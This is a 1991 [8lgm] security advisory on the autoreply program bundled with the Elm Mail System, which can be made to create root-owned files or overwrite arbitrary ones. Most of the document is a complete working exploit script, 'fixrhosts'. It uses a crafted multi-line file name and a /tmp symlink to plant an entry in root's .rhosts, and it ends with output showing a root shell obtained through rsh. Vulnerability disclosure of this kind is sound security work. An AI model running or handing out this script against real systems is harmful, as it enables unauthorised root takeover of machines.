<H1>[8lgm]-Advisory-2.UNIX.autoreply.12-Jul-1991
</H1>
<P>
<H2>PROGRAM:</H2>
<P>
<PRE>
        autoreply(1)    (/usr/local/bin/autoreply)
                        Supplied with the Elm Mail System
</PRE>
<P>
<H2>VULNERABLE OS's:</H2>
<P>
        Any system with a standard installation of The Elm Mail System.
        All versions are believed to have this vulnerability.
<P>
<H2>DESCRIPTION:</H2>
<P>
        autoreply(1) can be used to create root owned files, with mode 666.  
  It can also overwrite any file with semi user-controlled
        data.
<P>
<H2>IMPACT:</H2>
<P>
        Any user with access to autoreply(1) can alter system files and
        thus become root.
<P>
<H2>REPEAT BY:</H2>
<P>
        This example demonstrates how to become root on most affected
        machines by modifying root's .rhosts file.  Please do not do
        this unless you have permission.
<P>
        Create the following script, 'fixrhosts':
<P>
<pre>
8<--------------------------- cut here ----------------------------
#!/bin/sh
#
# fixrhosts rhosts-file user machine
#
if [ $# -ne 3 ]; then
        echo "Usage: `basename $0` rhosts-file user machine"
        exit 1
fi
RHOSTS="$1"
USERNAME="$2"
MACHINE="$3"
cd $HOME
echo x > "a
$MACHINE $USERNAME
b"
umask 022
autoreply "a
$MACHINE $USERNAME
b"
cat > /tmp/.rhosts.sh.$$ << 'EOF'
ln -s $1 `echo $$ | awk '{printf "/tmp/arep.%06d", $1}'`
exec autoreply off
exit 0
EOF
/bin/sh /tmp/.rhosts.sh.$$ $RHOSTS
rm -f /tmp/.rhosts.sh.$$ "a
$MACHINE $USERNAME
b"
exit 0

        You've been added to the autoreply system.
        You've been removed from the autoreply table.
>       % rsh localhost -l root csh -i
        Warning: no access to tty.
        Thus no job control in this shell.
